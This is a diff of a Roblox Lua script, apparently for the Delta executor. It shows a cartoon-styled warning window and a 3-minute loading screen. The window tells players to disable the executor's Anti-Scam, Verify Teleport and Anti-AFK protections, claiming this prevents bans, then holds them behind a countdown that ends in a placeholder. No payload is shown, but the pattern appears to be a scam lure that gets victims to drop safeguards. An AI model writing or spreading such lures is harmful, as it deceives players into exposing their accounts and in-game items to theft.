@@ -1,88 +1,169 @@
--- FULL SCRIPT GUI SYSTEM
--- Made for your request (Intro + Loading + Main Menu with Features)
+--// INTRO WARNING WINDOW
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "CustomScriptUI"
+gui.ResetOnSpawn = false
 
-local player = game.Players.LocalPlayer
-local PlayerGui = player:WaitForChild("PlayerGui")
+-- draggable frame
+local introFrame = Instance.new("Frame")
+introFrame.Size = UDim2.new(0, 450, 0, 220)
+introFrame.Position = UDim2.new(0.5, -225, 0.5, -110)
+introFrame.BackgroundColor3 = Color3.fromRGB(255, 220, 180)
+introFrame.BorderSizePixel = 0
+introFrame.Active = true
+introFrame.Draggable = true
+introFrame.Parent = gui
 
--- Utility: Draggable Frame
-local function makeDraggable(frame)
-    local dragging, dragInput, dragStart, startPos
-    frame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            dragging = true
-            dragStart = input.Position
-            startPos = frame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
-        end
-    end)
-    frame.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement then
-            dragInput = input
-        end
-    end)
-    game:GetService("UserInputService").InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            local delta = input.Position - dragStart
-            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-                                       startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
+local UICorner = Instance.new("UICorner", introFrame)
+UICorner.CornerRadius = UDim.new(0, 15)
+
+-- title bar
+local titleBar = Instance.new("Frame", introFrame)
+titleBar.Size = UDim2.new(1, 0, 0, 30)
+titleBar.BackgroundColor3 = Color3.fromRGB(255, 180, 120)
+titleBar.BorderSizePixel = 0
+Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 15)
+
+local title = Instance.new("TextLabel", titleBar)
+title.Text = "⚡ Script Warning"
+title.Size = UDim2.new(1, -60, 1, 0)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(50, 50, 50)
+title.TextScaled = true
+title.Font = Enum.Font.Cartoon
+
+-- minimize and close buttons
+local closeBtn = Instance.new("TextButton", titleBar)
+closeBtn.Text = "X"
+closeBtn.Size = UDim2.new(0, 30, 1, 0)
+closeBtn.Position = UDim2.new(1, -30, 0, 0)
+closeBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+closeBtn.TextScaled = true
+closeBtn.Font = Enum.Font.Cartoon
+
+local minimizeBtn = Instance.new("TextButton", titleBar)
+minimizeBtn.Text = "-"
+minimizeBtn.Size = UDim2.new(0, 30, 1, 0)
+minimizeBtn.Position = UDim2.new(1, -60, 0, 0)
+minimizeBtn.BackgroundColor3 = Color3.fromRGB(255, 200, 120)
+minimizeBtn.TextScaled = true
+minimizeBtn.Font = Enum.Font.Cartoon
+
+-- warning text
+local warningText = Instance.new("TextLabel", introFrame)
+warningText.Size = UDim2.new(1, -20, 1, -70)
+warningText.Position = UDim2.new(0, 10, 0, 40)
+warningText.BackgroundTransparency = 1
+warningText.TextWrapped = true
+warningText.TextColor3 = Color3.fromRGB(80, 50, 30)
+warningText.TextScaled = true
+warningText.Font = Enum.Font.Cartoon
+warningText.Text = [[
+Before you use the script make sure the following is OFF in Delta settings so you can't get banned.
+
+❌ Anti-Scam
+❌ Verify Teleport
+❌ Anti-AFK
+
+If you're done please proceed to the next Step and Press Okay.
+And wait to load the real script and you're good to go! ⚡
+]]
+
+-- OK Button
+local okBtn = Instance.new("TextButton", introFrame)
+okBtn.Size = UDim2.new(0, 150, 0, 40)
+okBtn.Position = UDim2.new(0.5, -75, 1, -50)
+okBtn.BackgroundColor3 = Color3.fromRGB(120, 200, 255)
+okBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
+okBtn.Text = "OKAY"
+okBtn.TextScaled = true
+okBtn.Font = Enum.Font.Cartoon
+Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)
+
+-- minimize functionality
+local minimized = false
+local logoBtn
+minimizeBtn.MouseButton1Click:Connect(function()
+	if minimized then
+		logoBtn:Destroy()
+		introFrame.Visible = true
+		minimized = false
+	else
+		introFrame.Visible = false
+		logoBtn = Instance.new("TextButton", gui)
+		logoBtn.Size = UDim2.new(0, 60, 0, 60)
+		logoBtn.Position = UDim2.new(0, 20, 0.8, 0)
+		logoBtn.BackgroundColor3 = Color3.fromRGB(100, 180, 255)
+		logoBtn.Text = "⚡"
+		logoBtn.TextScaled = true
+		logoBtn.Font = Enum.Font.Cartoon
+		logoBtn.MouseButton1Click:Connect(function()
+			logoBtn:Destroy()
+			introFrame.Visible = true
+			minimized = false
+		end)
+		minimized = true
+	end
+end)
+
+closeBtn.MouseButton1Click:Connect(function()
+	gui:Destroy()
+end)
+
+--// LOADING SCREEN
+local function startLoading()
+	introFrame:Destroy()
+	
+	local loadFrame = Instance.new("Frame", gui)
+	loadFrame.Size = UDim2.new(1, 0, 1, 0)
+	loadFrame.BackgroundColor3 = Color3.fromRGB(150, 100, 200)
+	loadFrame.BorderSizePixel = 0
+	
+	local gradient = Instance.new("UIGradient", loadFrame)
+	gradient.Color = ColorSequence.new{
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 180, 255)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 150, 200))
+	}
+	gradient.Rotation = 45
+	
+	local countdown = Instance.new("TextLabel", loadFrame)
+	countdown.Size = UDim2.new(1, 0, 0.2, 0)
+	countdown.Position = UDim2.new(0, 0, 0.4, 0)
+	countdown.BackgroundTransparency = 1
+	countdown.TextColor3 = Color3.new(1, 1, 1)
+	countdown.Font = Enum.Font.Cartoon
+	countdown.TextScaled = true
+	
+	local bar = Instance.new("Frame", loadFrame)
+	bar.Size = UDim2.new(1, 0, 0.02, 0)
+	bar.Position = UDim2.new(0, 0, 0.95, 0)
+	bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	
+	-- Hourglass
+	local hourglass = Instance.new("TextLabel", loadFrame)
+	hourglass.Size = UDim2.new(0, 100, 0, 100)
+	hourglass.Position = UDim2.new(0.5, -50, 0.2, 0)
+	hourglass.BackgroundTransparency = 1
+	hourglass.Text = "⌛"
+	hourglass.TextScaled = true
+	hourglass.Font = Enum.Font.Cartoon
+	hourglass.TextColor3 = Color3.fromRGB(255, 255, 200)
+	
+	-- 3 minutes timer
+	local totalTime = 180
+	for i = totalTime, 0, -1 do
+		local mins = math.floor(i/60)
+		local secs = i%60
+		countdown.Text = "⏳ Please wait: " .. string.format("%02d:%02d", mins, secs)
+		bar.Size = UDim2.new(i/totalTime, 0, 0.02, 0)
+		wait(1)
+	end
+	
+	loadFrame:Destroy()
+	
+	-- Dito papasok yung Main Menu (gaya ng ginawa ko dati)
+	print("Main Menu shows up here with features")
 end
 
--- INTRO WARNING GUI
-local introGui = Instance.new("ScreenGui", PlayerGui)
-introGui.Name = "IntroGui"
-
-local introFrame = Instance.new("Frame", introGui)
-introFrame.Size = UDim2.new(0, 400, 0, 230)
-introFrame.Position = UDim2.new(0.5, -200, 0.5, -115)
-introFrame.BackgroundColor3 = Color3.fromRGB(80, 170, 255)
-introFrame.Active = true
-introFrame.Draggable = false
-makeDraggable(introFrame)
-
-local uiCorner = Instance.new("UICorner", introFrame)
-uiCorner.CornerRadius = UDim.new(0,15)
-
-local title = Instance.new("TextLabel", introFrame)
-title.Size = UDim2.new(1, -60, 0, 40)
-title.Position = UDim2.new(0, 10, 0, 5)
-title.Text = "⚡ Script Notice"
-title.TextColor3 = Color3.fromRGB(255,255,0)
-title.Font = Enum.Font.Cartoon
-title.TextScaled = true
-title.BackgroundTransparency = 1
-
-local msg = Instance.new("TextLabel", introFrame)
-msg.Size = UDim2.new(1, -20, 0, 140)
-msg.Position = UDim2.new(0, 10, 0, 50)
-msg.TextWrapped = true
-msg.Text = "Before you use this script, make sure these are OFF in Delta Settings:\n\n- Anti-Scam\n- Verify Teleport\n- Anti-AFK\n\nAfter turning them off, press OK. Enjoy!"
-msg.TextColor3 = Color3.fromRGB(255,255,255)
-msg.Font = Enum.Font.Cartoon
-msg.TextScaled = true
-msg.BackgroundTransparency = 1
-
-local okBtn = Instance.new("TextButton", introFrame)
-okBtn.Size = UDim2.new(0, 120, 0, 40)
-okBtn.Position = UDim2.new(0.5, -60, 1, -50)
-okBtn.Text = "OK"
-okBtn.Font = Enum.Font.Cartoon
-okBtn.TextScaled = true
-okBtn.BackgroundColor3 = Color3.fromRGB(0,200,120)
-local okCorner = Instance.new("UICorner", okBtn)
-okCorner.CornerRadius = UDim.new(0,10)
-
-local closeBtn = Instance.new("TextButton", introFrame)
-closeBtn.Size = UDim2.new(0,30,0,30)
-closeBtn.Position = UDim2.new(1, -35, 0, 5)
-closeBtn.Text = "X"
-closeBtn.TextColor3 = Color3.fromRGB(255,0,0)
-closeBtn.Font = Enum.Font.Cartoon
-closeBtn.TextScaled = true
-
-local minBtn = Instance.new("TextButton", introFr
+okBtn.MouseButton1Click:Connect(startLoading)
